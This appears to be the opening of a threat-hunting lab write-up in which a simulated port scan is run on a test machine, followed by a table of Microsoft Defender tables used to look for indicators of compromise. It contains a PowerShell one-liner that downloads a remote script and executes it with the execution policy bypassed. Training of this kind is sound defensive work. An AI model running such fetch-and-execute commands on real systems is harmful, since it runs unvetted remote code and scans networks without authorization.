# Threat Hunt: Sudden Network Slowdown

### Phase 1: Simulating the Trigger Event

To begin this threat hunt, it was necessary to simulate suspicious network activity that would be logged by a security monitoring platform. The goal was to mimic the reconnaissance phase of an attack, specifically a network-wide port scan, which is a common cause of network degradation and a frequent trigger for a security investigation.

The following PowerShell command was executed on a test machine to generate this activity:

```powershell
# This one-line command first downloads a port scanning script...
Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1](https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1)' -OutFile 'C:\programdata\portscan.ps1';

# ...and then immediately executes it, bypassing the local security policy.
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
```
## Tables Used to Detect IoCs:
| Table Name | Purpose (in Simple English) | Official Documentation |
| :--- | :--- | :--- |
| **`DeviceFileEvents`** | Tracks events related to file creation, modification, and deletion on your devices. | [Microsoft Learn Link](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table) |
| **`DeviceProcessEvents`** | Monitors the creation of new processes, like when a program or script starts running. | [Microsoft Learn Link](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table) |
| **`DeviceNetworkEvents`**| Records all network activity, including inbound and outbound connections from devices. | [Microsoft Learn Link](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table) |
